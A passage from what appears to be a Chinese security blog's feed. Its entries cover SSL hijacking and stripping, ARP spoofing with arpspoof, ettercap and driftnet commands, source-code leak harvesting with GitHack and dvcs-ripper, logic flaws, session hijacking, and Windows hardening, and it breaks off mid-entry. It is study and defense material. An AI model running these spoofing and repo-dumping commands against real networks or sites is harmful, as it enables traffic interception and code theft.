title="SSL证书劫持(欺骗)攻击"></a>SSL证书劫持(欺骗)攻击</h1><p>SSL中间人劫持即攻击者首先通过ARP欺骗、DNS劫持甚至网关劫持等等</p><p>将客户端的访问重定向到攻击者的机器，让客户端机器与攻击者机器建立HTTPS连接（使用伪造证书），而攻击者机器再跟服务端连接。</p><p>这种情况由于证书是伪造的，所以证书认证会失败，浏览器会提示，如果不点继续是不会被劫持的</p><p>而一般用户由于安全意识比较淡薄，都会心甘情愿的上钩</p><p><strong>流程大致如下</strong>：</p><blockquote><p>1、截获客户端与服务器通信的通道;        （ ARP欺骗、DNS劫持甚至网关劫持 ）</p><p>2、然后在 SSL 建立连接的时候，进行中间人攻击</p><p>3、将自己伪装成客户端，获取到服务器真实有效的 CA 证书（非对称加密的公钥）</p><p>4、将自己伪装成服务器，获取到客服端的之后通信的密钥（对称加密的密钥）</p><p>5、有了证书和密钥就可以监听之后通信的内容了</p></blockquote><p> 客户端不要轻易信任证书 ，使用双向认证</p><h1 id="SSL剥离-降级-攻击"><a href="#SSL剥离-降级-攻击" class="headerlink" title="SSL剥离(降级)攻击"></a>SSL剥离(降级)攻击</h1><p>SSL 剥离就是将客户端的 HTTPS 请求降级成 HTTP 请求，阻止 HTTP 请求重定向成 HTTPS</p><p>该攻击方式主要是利用用户并不会每次都直接在浏览器上输入<code>https://xxx.xxx.com</code>来访问网站</p><p>或者有些网站<strong>并非全网HTTPS</strong>，而是只在需要进行敏感数据传输时才使用HTTPS </p><p>中间人攻击者在劫持了客户端与服务端的HTTP会话后，将HTTP页面里面所有的 <code>https://</code> 超链接都换成 <code>http://</code> </p><p>用户在点击相应的链接时，是使用HTTP协议来进行访问；</p><p>这样，就算服务器对相应的URL只支持HTTPS链接，但中间人一样可以和服务建立HTTPS连接之后</p><p>将数据使用HTTP协议转发给客户端，实现会话劫持。 </p><h1 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h2><p>每台主机都有一个ARP缓存表，缓存表中记录了IP地址与MAC地址的对应关系，而局域网数据传输依靠的是MAC地址。</p><p>在ARP缓存表机制存在一个缺陷，就是当请求主机收到ARP应答包后，不会去验证自己是否向对方主机发送过ARP请求包，</p><p>就直接把这个返回包中的IP地址与MAC地址的对应关系保存进ARP缓存表中，如果原有相同IP对应关系，原有的则会被替换。</p><p>这样攻击者就有了偷听主机传输的数据的可能</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><strong>两种ARP欺骗方式</strong></p><blockquote><p><strong>1、攻击者仅仅欺骗被攻击主机(单向):</strong></p><p>主机C向主机B发送伪造的ARP回应包，声称自己的MAC地址就是网关对应的IP；</p><p>这样，主机B就会将所有的流量发送主机C(攻击者)，主机C开启ip_forward路由转发功能将数据包进行转发</p><p><strong>2、攻击者同时欺骗被攻击主机和网关(双向)：</strong><br>主机C向网关发送ARP回应包，声称自己是主机B，同时向主机B发送ARP回应包；</p><p>声称自己是网关，这样，网关和主机B两边的流量都会发往主机C，主机C只需要打开ip_forward路由转发</p></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#1、开启路由转发</span></span><br><span class="line">cat /proc/sys/net/ipv4/ip_forward<span class="comment">#查看值</span></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward<span class="comment">#修改</span></span><br><span class="line">cat /proc/sys/net/ipv4/ip_forward<span class="comment">#检查</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2、ARP投毒、双向欺骗</span></span><br><span class="line">arpspoof -i eth0 -t 192.168.1.109 192.168.1.1<span class="comment">#告诉被攻击者B，网关A的IP的MAC地址就是攻击者C的MAC地址</span></span><br><span class="line">rpspoof -i eth0 -t 192.168.1.1 192.168.1.109<span class="comment">#告诉网关A，被攻击者B的IP的MAC地址就是攻击者C的MAC地址</span></span><br><span class="line"><span class="comment">#被攻击者(B)：192.168.1.109</span></span><br><span class="line"><span class="comment">#网关(A)：192.168.1.1</span></span><br></pre></td></tr></table></figure><p>然后<code>攻击者</code>就可以监听受害者浏览的内容了：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">driftnet -i eth0<span class="comment">#还可以使用wireshark抓包</span></span><br></pre></td></tr></table></figure><p><strong>Ettercap进行ARP欺骗</strong> </p><p>重要插件：</p><blockquote><p>dns_spoof        (执行DNS欺骗攻击) </p><p>Dos_attack        (对受害主机进行拒绝服务攻击) </p><p>Chk_poison        (检测是否成功进行了攻击) </p><p>Repoison_arp    (顾名思义，修复ARP) </p></blockquote><p>参数：</p><blockquote><p>-t 只监听这种协议 </p><p>-T ettercap检查pcap文件（脱机监听） </p><p>-q 安静（不回显） </p><p>-M 这是一个重要的参数，他会告诉ettercap执行中间人攻击，使用这个参数很简单，如 -M method </p></blockquote><p>栗子：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ettercap -T -q -M ARP  //对所有主机进行ARP欺骗</span><br><span class="line">ettercap -T -q -M ARP 192.168.1.109  //欺骗单一主机</span><br><span class="line">driftnet -i eth0   //开始监听</span><br></pre></td></tr></table></figure><h4 id="MITMF中间人攻击框架"><a href="#MITMF中间人攻击框架" class="headerlink" title="MITMF中间人攻击框架"></a><a href="https://github.com/byt3bl33d3r/MITMf" target="_blank" rel="noopener">MITMF中间人攻击框架</a></h4><h2 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h2><blockquote><p>1.在主机绑定网关MAC与IP地址为静态（默认为动态），命令：arp -s 网关IP 网关MAC</p><p>2.在网关绑定主机MAC与IP地址</p><p>3.使用<code>ARP</code>防火墙</p></blockquote><h2 id="实战参考"><a href="#实战参考" class="headerlink" title="实战参考"></a><a href="https://www.cnblogs.com/LittleHann/p/3735602.html#_lab2_1_1" target="_blank" rel="noopener">实战参考</a></h2><blockquote><p> dsniff - 一个实现<a href="https://zh.wikipedia.org/wiki/SSH" target="_blank" rel="noopener">SSH</a>和<a href="https://zh.wikipedia.org/wiki/SSL" target="_blank" rel="noopener">SSL</a>中间人攻击的工具 </p><p> Ettercap - 一个基于<a href="https://zh.wikipedia.org/wiki/局域网" target="_blank" rel="noopener">局域网</a>的中间人攻击工具 </p><p> SSLStrip一个基于SSL的MITM攻击的工具 </p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;中间人攻击&quot;&gt;&lt;a href=&quot;#中间人攻击&quot; class=&quot;headerlink&quot; title=&quot;中间人攻击&quot;&gt;&lt;/a&gt;中间人攻击&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;攻击者在请求和响应传输途中，拦截并篡改内容。&lt;/p&gt;
&lt;p&gt;对于 HTTP 来说，由于设计
      
    
    </summary>
    
    
      <category term="【1】Web安全" scheme="https://wintrysec.github.io/categories/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>源码泄露总结</title>
    <link href="https://wintrysec.github.io/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8-%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%80%BB%E7%BB%93/"/>
    <id>https://wintrysec.github.io/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8-%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%80%BB%E7%BB%93/</id>
    <published>2020-08-12T14:03:00.000Z</published>
    <updated>2020-08-12T09:19:55.729Z</updated>
    
    <content type="html"><![CDATA[<h1 id="git源码泄漏"><a href="#git源码泄漏" class="headerlink" title=".git源码泄漏"></a>.git源码泄漏</h1><p>在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录</p><p>在发布代码的时候，.git目录没有删除，使用这个文件，可以恢复源代码。</p><p><strong>文件夹分析</strong></p><blockquote><p><strong>index：</strong>文件保存暂存区信息；</p><p><strong>hook：</strong>存放一些sheel的地方。<br><strong>info：</strong>存放仓库的信息<br><strong>object：</strong>存放所有git对象的地方<br><strong>refs：</strong>存放提交hash的地方<br><strong>config：</strong>github的配置信息<br><strong>description：</strong>仓库的描述信息，主要给gitweb等git托管系统使用<br><strong>HEAD：</strong>映射到ref引用，能够找到下一次commit的前一次哈希值</p></blockquote><p>git是一套内容寻址文件系统</p><p><strong>1.寻址方式</strong><br>git采用HashTable的方式进行寻址<br>这里使用的key就是文件（头+内容）的哈希值，value就是经过压缩后的文件内容</p><p><strong>2.git对象的类型</strong></p><blockquote><p><strong>Blob：</strong>blob对象可以存储所有的文件类型。<br><strong>tree：</strong>tree对象是用来组织Blob对象的一种数据类型。树节点<br><strong>commit：</strong>父节点</p></blockquote><p><strong>3.Git对象的存储方式</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Key = sha1(file_header + file_content)</span><br><span class="line">Value = zlib(file_content)</span><br></pre></td></tr></table></figure><blockquote><p>40位的sha-1校验和，将该校验和的前2位作为object目录中的子目录的名称，后38位作为子目录中的文件名</p></blockquote><p>利用Githack脚本，下载全部源码</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python2 GitHack.py http://xxx.com/.git/</span><br></pre></td></tr></table></figure><h1 id="hg源码泄漏"><a href="#hg源码泄漏" class="headerlink" title=".hg源码泄漏"></a>.hg源码泄漏</h1><p>hg init的时候会生成.hg</p><p>工具：dvcs-ripper</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rip-hg.pl -v -u http://www.example.com/.hg/</span><br><span class="line"></span><br><span class="line">cat .hg/store/fncache</span><br></pre></td></tr></table></figure><h1 id="SVN源码泄漏"><a href="#SVN源码泄漏" class="headerlink" title=".SVN源码泄漏"></a>.SVN源码泄漏</h1><p>代码放到生产坏境中后，没有清理 svn 的一些信息，导致 svn 残留</p><p>工具：dvcs-ripper</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rip-svn.pl -v -u http://www.localhost.test/.svn/</span><br><span class="line"></span><br><span class="line">从 xxx.db 中找到 flag 的文件的文件名,然后访问</span><br><span class="line">cat xxx.db | grep flag</span><br><span class="line"></span><br><span class="line">或找cat .svn/pristine/ 中的文件</span><br></pre></td></tr></table></figure><h1 id="Bazaar-bzr"><a href="#Bazaar-bzr" class="headerlink" title="Bazaar/bzr"></a>Bazaar/bzr</h1><p>工具：</p><p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rip-bzr.pl -v -u http://www.example.com/.bzr/</span><br></pre></td></tr></table></figure><h1 id="DS-Store文件泄漏"><a href="#DS-Store文件泄漏" class="headerlink" title=".DS_Store文件泄漏"></a>.DS_Store文件泄漏</h1><p>在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息</p><p>工具：<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">dsstoreexp</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python ds_store_exp.py http://www.example.com/.DS_Store</span><br></pre></td></tr></table></figure><h1 id="网站备份文件"><a href="#网站备份文件" class="headerlink" title="网站备份文件"></a>网站备份文件</h1><p>当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站 web 目录下</p><p>而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.rar   .zip  .7z   .tar.gz   .bak    .swp   .txt</span><br></pre></td></tr></table></figure><h1 id="WEB-INF-web-xml-泄露"><a href="#WEB-INF-web-xml-泄露" class="headerlink" title="WEB-INF/web.xml 泄露"></a>WEB-INF/web.xml 泄露</h1><p>WEB-INF 是 Java 的 WEB 应用的安全目录。</p><p>该目录原则上来说是客户端无法访问，只有服务端才可以可以访问。</p><p>如果想在页面中直接访问其中的文件，必须通过 web.xml 文件对要访问的文件进行相应映射才能访问。</p><p><strong>WEB-INF 主要包含以下文件或目录：</strong></p><blockquote><p>/WEB-INF/web.xml：Web 应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则；</p><p>/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非 servlet class，他们不能包含在 .jar 文件中；</p><p>/WEB-INF/lib/：存放 web 应用需要的各种 JAR 文件，放置仅在这个应用中要求使用的 jar 文件 , 如数据库驱动 jar 文件；</p><p>/WEB-INF/src/：源码目录，按照包名结构放置各个 java 文件；</p><p>/WEB-INF/database.properties：数据库配置文件。</p></blockquote><hr><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如</span><br><span class="line">http:&#x2F;&#x2F;example.com&#x2F;dir&#x2F;WEB-INF&#x2F;web.xml</span><br></pre></td></tr></table></figure><h1 id="CVS泄漏"><a href="#CVS泄漏" class="headerlink" title="CVS泄漏"></a>CVS泄漏</h1><p>测试的目录</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;url&#x2F;CVS&#x2F;Root 返回根信息</span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;CVS&#x2F;Entries 返回所有文件的结构</span><br></pre></td></tr></table></figure><p>取回源码的命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bk <span class="built_in">clone</span> http://url/name dir</span><br><span class="line">bk <span class="built_in">clone</span> http://url/name ./</span><br><span class="line"><span class="comment">#把远端一个名为name的repo clone到本地当前目录下</span></span><br></pre></td></tr></table></figure><p>查看所有的改变的命令，转到download的目录</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bk changes</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;git源码泄漏&quot;&gt;&lt;a href=&quot;#git源码泄漏&quot; class=&quot;headerlink&quot; title=&quot;.git源码泄漏&quot;&gt;&lt;/a&gt;.git源码泄漏&lt;/h1&gt;&lt;p&gt;在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代
      
    
    </summary>
    
    
      <category term="【1】Web安全" scheme="https://wintrysec.github.io/categories/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>逻辑漏洞挖掘</title>
    <link href="https://wintrysec.github.io/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    <id>https://wintrysec.github.io/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-08-12T14:02:00.000Z</published>
    <updated>2020-08-12T09:18:57.407Z</updated>
    
    <content type="html"><![CDATA[<p><strong>挖掘重点：</strong></p><p><strong>业务流程和HTTP/HTTPS请求篡改。</strong></p><h1 id="常见的逻辑漏洞"><a href="#常见的逻辑漏洞" class="headerlink" title="常见的逻辑漏洞"></a>常见的逻辑漏洞</h1><p>其中 2、3、4 是金融业务中常见的。</p><p><strong>(1) 密码重置</strong></p><blockquote><p>验证码直接在HTTP响应中返回；</p><p>验证码未绑定用户，没和手机号和邮箱号做匹配验证；</p><p>未校验用户字段值，改自己密码，最后提交其它UID；</p><p>验证码不失效，可枚举；</p></blockquote><p><strong>(2) 支付订单</strong></p><blockquote><p>篡改支付金额，运费修改为负数，使总金额降低。</p></blockquote><p><strong>(3) 竞争条件</strong></p><blockquote><p>在文件上传中和购物时；</p><p>A用户余额10元，B商品5元，C商品6元;</p><p>A利用竞争条件多线程同时发起购买B和C的请求；</p><p>可能的结果有：</p><p>有一件商品购买失败；</p><p>商品都购买成功，但只扣了6元；</p><p>商品都购买成功，但余额为 -1元；</p></blockquote><p><strong>(4) 越权访问</strong></p><blockquote><p>越权访问他人信息或操纵他人账号</p><p><strong>水平越权：</strong></p><p>同级别(权限)用户之间，越权访问非法操纵其它账户；(这会导致大批量数据泄露，恶意篡改)</p><p><strong>垂直越权：</strong></p><p>不同级别之间的用户越权，普通用户执行管理员的功能；</p></blockquote><p><strong>越权访问攻击测试：</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1、改ID; ?id=1</span><br><span class="line">2、改用户名；login.php?username=admin</span><br></pre></td></tr></table></figure><p><strong>越权访问修复建议：</strong></p><p>越权访问漏洞的主要原因是没有对用户的身份做判断和控制，防护这种漏洞可以通过session来控制。</p><p>用户登录成功后，把username和UID等信息写入到session中，</p><p>当查看个人信息时，从session中取出username，而不是从GET和POST取，此时username就是没被篡改的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;挖掘重点：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;业务流程和HTTP/HTTPS请求篡改。&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&quot;常见的逻辑漏洞&quot;&gt;&lt;a href=&quot;#常见的逻辑漏洞&quot; class=&quot;headerlink&quot; title=&quot;常见的
      
    
    </summary>
    
    
      <category term="【1】Web安全" scheme="https://wintrysec.github.io/categories/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>会话管理漏洞</title>
    <link href="https://wintrysec.github.io/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E6%BC%8F%E6%B4%9E/"/>
    <id>https://wintrysec.github.io/2020/08/12/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-08-12T14:01:00.000Z</published>
    <updated>2020-08-12T09:18:58.470Z</updated>
    
    <content type="html"><![CDATA[<h1 id="会话劫持"><a href="#会话劫持" class="headerlink" title="会话劫持"></a>会话劫持</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><blockquote><p>会话劫持（Session hijacking），这是一种通过获取用户 Session ID 后，使用该 Session ID 登录目标账号的攻击方法，</p><p>此时攻击者实际上是使用了目标会话固定漏洞基本防御方法 账户的有效 Session。</p><p>会话劫持的第一步是取得一个合法的会话标识来伪装成合法用户，因此需要保证会话标识不被泄漏。 </p></blockquote><blockquote><p>受害者登录站点，服务器返回一个会话标识(Session ID)</p><p>黑客捕获这个<strong>Session ID</strong>（ 网络嗅探，XSS ），使用这个Session ID访问站点获得受害者合法会话</p></blockquote><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><blockquote><p><strong>XSS漏洞引起的会话劫持：</strong>使用http-only来防止JS获取cookie中的Session ID信息</p><p><strong>网络嗅探引起的会话劫持：</strong>使用HTTPS+secure来保证Session ID不被嗅探获取到</p></blockquote><h3 id="Session机制"><a href="#Session机制" class="headerlink" title="Session机制"></a>Session机制</h3><p>Session机制是一种<strong>服务器端</strong>的机制，服务器使用一种类似于散列表的结构来保存信息用于保持状态。</p><p>保存这个Session ID最为方便的方式是采用Cookie。</p><blockquote><p>Cookie的名字都是类似于SESSIONID；</p><p>weblogic对于web应用程序生成的cookie，JSESSIONID；</p><p>PHP中Session的默认名称是PHPSESSID。</p></blockquote><h3 id="Cookie属性"><a href="#Cookie属性" class="headerlink" title="Cookie属性"></a>Cookie属性</h3><p><strong>HttpOnly设置方法</strong></p><p>服务端发送cookie的时候，可以设置HTTP-Only ，禁止JS获取Cookie内容</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Set-Cookie</span>: SESSIONID=abc123; expires=Wednesday, 17-Nov-99 23:12:40 GMT; HttpOnly</span><br></pre></td></tr></table></figure><p><strong>Secure</strong></p><p>设置cookie的某个值secure为True时， 此cookie只有在HTTPS协议中才会进行传输 </p><p>HTTP协议传输时，是不传输此协议的。 </p><h1 id="会话固定"><a href="#会话固定" class="headerlink" title="会话固定"></a>会话固定</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><blockquote><p>会话固定（Session fixation）是一种诱骗受害者使用攻击者指定的会话标识（Session ID）的攻击手段。</p><p>这是攻击者获取合法会话标识的最简单的方法。</p><p>会话固定也可以看成是会话劫持的一种类型，原因是会话固定的攻击的主要目的同样是获得目标用户的合法会话</p><p>不过会话固定还可以是强迫受害者使用攻击者设定的一个有效会话，以此来获得用户的敏感信息。</p></blockquote><blockquote><ul><li>访问网站时，网站会设置cookie中的Session ID</li><li><strong>当用户登录后，cookie中的SessionID保持不变</strong>（<strong>形成原因</strong>）</li><li>只要获取登陆前的Session ID内容，就可以知道登陆后的Session ID</li><li>黑客用该Session ID构造链接，发送给受害者点击后，黑客成功劫持受害者的会话</li></ul></blockquote><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><blockquote><p><strong>访问网站（未登录）：</strong>获取cookie信息，获取Session ID</p><p><strong>登录网站：</strong>查看Cookie信息，获取Session ID</p><p><strong>查看登录前，登录后SessionID是否相同</strong> </p></blockquote><h2 id="防御方法-1"><a href="#防御方法-1" class="headerlink" title="防御方法"></a>防御方法</h2><p>1、在用户登录成功后重新创建一个Session ID，使登录前的匿名会话强制失效 </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 会话失效</span></span><br><span class="line">session.invalidate();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 会话重建</span></span><br><span class="line">session=request.getSession(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><p>2、<strong>SessionID与浏览器绑定：</strong>SessionID与所访问浏览器有变化，立即重置 </p><p>3、<strong>SessionID与所访问的IP绑定：</strong>SessionID与所访问IP有变化，立即重置 </p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;会话劫持&quot;&gt;&lt;a href=&quot;#会话劫持&quot; class=&quot;headerlink&quot; title=&quot;会话劫持&quot;&gt;&lt;/a&gt;会话劫持&lt;/h1&gt;&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h
      
    
    </summary>
    
    
      <category term="【1】Web安全" scheme="https://wintrysec.github.io/categories/%E3%80%901%E3%80%91Web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>【2 蓝队】Windows安全加固</title>
    <link href="https://wintrysec.github.io/2020/08/12/%E3%80%903%E3%80%91%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E3%80%908%20%E8%93%9D%E9%98%9F%E3%80%91%E5%9F%BA%E7%BA%BF%E5%8A%A0%E5%9B%BA/Windows%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/"/>
    <id>https://wintrysec.github.io/2020/08/12/%E3%80%903%E3%80%91%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E3%80%908%20%E8%93%9D%E9%98%9F%E3%80%91%E5%9F%BA%E7%BA%BF%E5%8A%A0%E5%9B%BA/Windows%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/</id>
    <published>2020-08-12T14:00:00.000Z</published>
    <updated>2020-08-21T08:08:16.159Z</updated>
    
    <content type="html"><![CDATA[<h2 id="账户管理和认证授权"><a href="#账户管理和认证授权" class="headerlink" title="账户管理和认证授权"></a>账户管理和认证授权</h2><h3 id="1-1-账户"><a href="#1-1-账户" class="headerlink" title="1.1 账户"></a>1.1 账户</h3><h4 id="默认账户安全"><a href="#默认账户安全" class="headerlink" title="默认账户安全"></a>默认账户安全</h4><blockquote><ul><li>禁用Guest账户。</li><li>禁用或删除其他无用账户（建议先禁用账户三个月，待确认没有问题后删除。）</li></ul></blockquote><p><strong>操作步骤</strong></p><blockquote><p><strong>本地用户和组</strong> &gt; <strong>用户</strong> 中，双击 <strong>Guest</strong> 帐户，在属性中选中 <strong>帐户已禁用</strong>，单击 <strong>确定</strong>。</p></blockquote><h4 id="按照用户类别分配帐户"><a href="#按照用户类别分配帐户" class="headerlink" title="按照用户类别分配帐户"></a>按照用户类别分配帐户</h4><p>按照用户分配帐户。根据业务要求，设定不同的用户和用户组。例如，管理员用户，数据库用户，审计用户，来宾用户等。</p><h4 id="定期检查并删除与无关帐户"><a href="#定期检查并删除与无关帐户" class="headerlink" title="定期检查并删除与无关帐户"></a>定期检查并删除与无关帐户</h4><p>定期删除或锁定与设备运行、维护等与工作无关的帐户。</p><h4 id="不显示最后的用户名"><a href="#不显示最后的用户名" class="headerlink" title="不显示最后的用户名"></a>不显示最后的用户名</h4><p>配置登录登出后，不显示用户名称。</p><p><strong>操作步骤：</strong></p><blockquote><p><strong>gpedit.msc 打开组策略</strong>，在 <strong>本地策略</strong> &gt; <strong>安全选项</strong> 中，双击 <strong>交互式登录:不显示最后的用户名</strong>，选择 <strong>已启用</strong> 并单击 <strong>确定</strong>。</p></blockquote><h3 id="1-2-口令"><a href="#1-2-口令" class="headerlink" title="1.2 口令"></a>1.2 口令</h3><h4 id="密码复杂度"><a href="#密码复杂度" class="headerlink" title="密码复杂度"></a>密码复杂度</h4><blockquote><p>最短密码长度要求八个字符。</p><p>启用本机组策略中密码必须符合复杂性要求的策略。</p></blockquote><p>即密码至少包含以下四种类别的字符中的两种：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">英语大写字母 A, B, C, … Z</span><br><span class="line">英语小写字母 a, b, c, … z</span><br><span class="line">西方阿拉伯数字 0, 1, 2, … 9</span><br><span class="line">非字母数字字符，如标点符号，@, #, $, %, &amp;, *等</span><br></pre></td></tr></table></figure><p><strong>操作步骤</strong></p><blockquote><p><strong>gpedit.msc 打开组策略</strong>，在 <strong>帐户策略</strong> &gt; <strong>密码策略</strong> 中，确认 <strong>密码必须符合复杂性要求</strong> 策略已启用。</p></blockquote><h4 id="密码最长留存期"><a href="#密码最长留存期" class="headerlink" title="密码最长留存期"></a>密码最长留存期</h4><p>对于采用静态口令认证技术的设备，帐户口令的留存期不应长于90天。</p><p><strong>操作步骤</strong></p><blockquote><p>在 <strong>帐户策略</strong> &gt; <strong>密码策略</strong> 中，配置 <strong>密码最长使用期限</strong> 不大于90天。</p></blockquote><h4 id="帐户锁定策略"><a href="#帐户锁定策略" class="headerlink" title="帐户锁定策略"></a>帐户锁定策略</h4><p>对于采用静态口令认证技术的设备，应配置当用户连续认证失败次数超过10次后，锁定该用户使用的帐户。</p><p><strong>操作步骤</strong></p><blockquote><p>在 <strong>帐户策略</strong> &gt; <strong>帐户锁定策略</strong> 中，配置 <strong>帐户锁定阈值</strong> 不大于10次。</p></blockquote><h3 id="1-3-授权"><a href="#1-3-授权" class="headerlink" title="1.3 授权"></a>1.3 授权</h3><h4 id="远程关机"><a href="#远程关机" class="headerlink" title="远程关机"></a>远程关机</h4><p>在本地安全设置中，从远端系统强制关机权限只分配给Administrators组。</p><p><strong>操作步骤</strong></p><blockquote><p>在 <strong>本地策略</strong> &gt; <strong>用户权限分配</strong> 中，配置 <strong>从远端系统强制关机</strong> 权限只分配给Administrators组。</p></blockquote><h4 id="本地关机"><a href="#本地关机" class="headerlink" title="本地关机"></a>本地关机</h4><p>在本地安全设置中关闭系统权限只分配给Administrators组。</p><p><strong>操作步骤</strong></p><blockquote><p>在 <strong>本地策略</strong> &gt; <strong>用户权限分配</strong> 中，配置 <strong>关闭系统</strong> 权限只分配给Administrators组。</p></blockquote><h4 id="用户权限指派"><a href="#用户权限指派" class="headerlink" title="用户权限指派"></a>用户权限指派</h4><p>在本地安全设置中，取得文件或其它对象的所有权权限只分配给Administrators组。</p><p><strong>操作步骤</strong></p><blockquote><p>在 <strong>本地策略</strong> &gt; <strong>用户权限分配</strong> 中，配置 <strong>取得文件或其它对象的所有权</strong> 权限只分配给Administrators组。</p></blockquote><h4 id="授权帐户登录"><a href="#授权帐户登录" class="headerlink" title="授权帐户登录"></a>授权帐户登录</h4><p>在本地安全设置中，配置指定授权用户允许本地登录此计算机。</p><p><strong>操作步骤</strong></p><blockquote><p>在 <strong>本地策略</strong> &gt; <strong>用户权限分配</strong> 中，配置 <strong>允许本地登录</strong> 权限给指定授权用户。</p></blockquote><h4 id="授权帐户从网络访问"><a href="#授权帐户从网络访问" class="headerlink" title="授权帐户从网络访问"></a>授权帐户从网络访问</h4><p>在本地安全设置中，只允许授权帐号从网络访问（包括网络共享等，但不包括终端服务）此计算机。</p><p><strong>操作步骤</strong></p><blockquote><p>在 <strong>本地策略</strong> &gt; <strong>用户权限分配</strong> 中，配置 <strong>从网络访问此计算机</strong> 权限给指定授权用户。</p></blockquote><h4 id="多用户同时使用的安全配置"><a href="#多用户同时使用的安全配置" class="headerlink" title="多用户同时使用的安全配置"></a>多用户同时使用的安全配置</h4><blockquote><p>在 <strong>本地策略</strong> &gt; <strong>用户权限分配</strong> 中，配置 <strong>从网络访问此计算机</strong> 权限给指定授权用户。</p></blockquote><h4 id="限制远程登录空闲断开时间"><a href="#限制远程登录空闲断开时间" class="headerlink" title="限制远程登录空闲断开时间"></a>限制远程登录空闲断开时间</h4><p>对于远程登录的帐户，设置不活动超过时间15分钟自动断开连接。</p><p><strong>操作步骤</strong></p><blockquote><p>在 <strong>本地策略</strong> &gt; <strong>安全选项</strong> 中，设置 <strong>Microsoft网络服务器：暂停会话前所需的空闲时间数量</strong> 属性为15分钟。</p></blockquote><h4 id="设置屏幕保护密码和开启时间"><a href="#设置屏幕保护密码和开启时间" class="headerlink" 